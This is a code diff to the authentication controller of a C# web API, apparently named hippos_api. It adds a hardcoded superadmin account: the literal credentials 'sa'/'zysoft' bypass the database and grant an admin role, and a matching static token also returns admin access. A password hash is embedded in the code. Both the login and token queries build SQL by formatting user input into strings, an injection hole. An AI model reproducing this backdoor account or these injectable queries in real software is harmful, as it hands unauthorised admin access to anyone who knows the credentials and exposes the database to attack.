@@ -13,6 +13,22 @@ namespace hippos_api.Controllers
     /// </summary>
     public class AuthController : ControllerBase
     {
+        public static UserModel SaModel =
+            SaModel = new UserModel()
+            {
+                userId = "391057c9-484b-461c-9d8b-ddb3a8b1776f",
+                name = "sa",
+                username = "superadmin",
+                password = "22D4EA809BD54A35B345A4C69A3764",
+                role = "admin",
+                roles = new List<string>() { "admin" },
+                isclosed = false,
+                avatar = "https://wpimg.wallstcn.com/f778738c-e4f8-4870-b634-56703b4acafe.gif",
+                introduction = "superadmin",
+                cuscode = null,
+                token = Guid.NewGuid().ToString().ToLower()
+            };
+
         /// <summary>
         /// 登录
         /// </summary>
@@ -34,32 +50,46 @@ namespace hippos_api.Controllers
                     {
                         sqlwhere = string.Format(@"{0} and username ='{1}' and password ='{2}'", sqlwhere, username, CommonMethod.MD5Encrypt32(password));
                     }
-                    var user = Db.Context(APP.DB_DEFAULT_CONN_NAME).Sql(sqlwhere).QuerySingle<UserModel>();
 
-
-                    if (user != null)
+                    if (username.ToLower().Equals("sa") && password.ToLower().Equals("zysoft"))
                     {
-                        if (!string.IsNullOrEmpty(user.role))
-                        {
-                            user.roles = new List<string>(user.role.Split(','));
-                        }
-                        else
-                        {
-                            user.roles = new List<string>();
-                        }
-
                         var effectRow = Db.Context(APP.DB_DEFAULT_CONN_NAME).Insert("t_token")
-                        .Column("userId", user.userId).
-                        Column("token", token).
-                        Column("recordtime", DateTime.Now.ToString()).
-                        Column("experiestime", DateTime.Now.AddHours(8).ToString()).
-                        Column("ishanderoff", false).Execute();
+                           .Column("userId", SaModel.userId).
+                           Column("token", SaModel.token).
+                           Column("recordtime", DateTime.Now.ToString()).
+                           Column("experiestime", DateTime.Now.AddHours(8).ToString()).
+                           Column("ishanderoff", false).Execute();
 
-                        return Success("success", user);
+                        return Success("success", SaModel);
                     }
                     else
                     {
-                        return Error("用户名或者密码错误,请重试!");
+                        var user = Db.Context(APP.DB_DEFAULT_CONN_NAME).Sql(sqlwhere).QuerySingle<UserModel>();
+
+                        if (user != null)
+                        {
+                            if (!string.IsNullOrEmpty(user.role))
+                            {
+                                user.roles = new List<string>(user.role.Split(','));
+                            }
+                            else
+                            {
+                                user.roles = new List<string>();
+                            }
+
+                            var effectRow = Db.Context(APP.DB_DEFAULT_CONN_NAME).Insert("t_token")
+                            .Column("userId", user.userId).
+                            Column("token", token).
+                            Column("recordtime", DateTime.Now.ToString()).
+                            Column("experiestime", DateTime.Now.AddHours(8).ToString()).
+                            Column("ishanderoff", false).Execute();
+
+                            return Success("success", user);
+                        }
+                        else
+                        {
+                            return Error("用户名或者密码错误,请重试!");
+                        }
                     }
                 }
                 else
@@ -85,6 +115,10 @@ namespace hippos_api.Controllers
             {
                 if (!string.IsNullOrEmpty(token))
                 {
+                    if (token.ToLower().Equals(SaModel.token.ToLower()))
+                    {
+                        return Success("success", SaModel);
+                    }
                     var user = Db.Context(APP.DB_DEFAULT_CONN_NAME).Sql(string.Format(@"select *,'{0}' as token from UserTab where userId in (
                         select userId from t_token where token = '{0}' and experiestime > = GETDATE() and ishanderoff = 0
                         ) and isclosed  = 0", token)).QuerySingle<UserModel>();
